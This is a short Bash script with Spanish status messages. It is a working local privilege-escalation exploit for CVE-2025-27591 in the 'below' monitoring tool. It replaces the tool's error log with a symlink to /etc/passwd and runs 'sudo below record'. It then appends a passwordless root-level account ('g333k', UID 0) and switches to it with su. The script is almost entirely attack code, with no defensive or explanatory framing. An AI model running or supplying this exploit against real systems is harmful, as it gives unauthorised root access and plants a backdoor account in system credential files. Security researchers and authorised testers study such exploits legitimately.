#!/bin/bash

ROJO="\e[91m"
VERDE="\e[92m"
AMARILLO="\e[93m"
AZUL="\e[94m"
RESET="\e[0m"

bin_path="/usr/bin/below"
log_folder="/var/log/below"
log_target="$log_folder/error_root.log"
evil_line="g333k::0:0:g333k:/root:/bin/bash"

echo -e "${AMARILLO}[*] Verificando posible CVE-2025-27591...${RESET}"

if [ ! -d "$log_folder" ]; then
    echo -e "${ROJO}[-] No existe $log_folder${RESET}"
    exit 1
fi

if [ ! -w "$log_folder" ]; then
    echo -e "${ROJO}[-] $log_folder no es world-writable${RESET}"
    exit 1
fi
echo -e "${VERDE}[+] $log_folder es world-writable${RESET}"

if [ -e "$log_target" ]; then
    if [ -L "$log_target" ]; then
        echo -e "${VERDE}[+] $log_target ya es symlink${RESET}"
    else
        echo -e "${AMARILLO}[!] $log_target es archivo normal, borrando...${RESET}"
        rm -f "$log_target"
    fi
fi

ln -sf /etc/passwd "$log_target"
echo -e "${VERDE}[+] Symlink preparado: $log_target -> /etc/passwd${RESET}"

echo -e "${AZUL}[*] Ejecutando 'below record' con sudo...${RESET}"
if sudo "$bin_path" record; then
    echo -e "${VERDE}[+] 'below record' ejecutado${RESET}"
else
    echo -e "${AMARILLO}[!] 'below record' pudo fallar, revisa manualmente${RESET}"
fi

echo -e "${AZUL}[*] Insertando payload en /etc/passwd...${RESET}"
echo "$evil_line" >> "$log_target" && echo -e "${VERDE}[+] Payload insertado${RESET}" || echo -e "${ROJO}[-] Falló insertando payload${RESET}"

echo -e "${AMARILLO}[*] Cambiando a shell con 'su g333k'...${RESET}"
su g333k

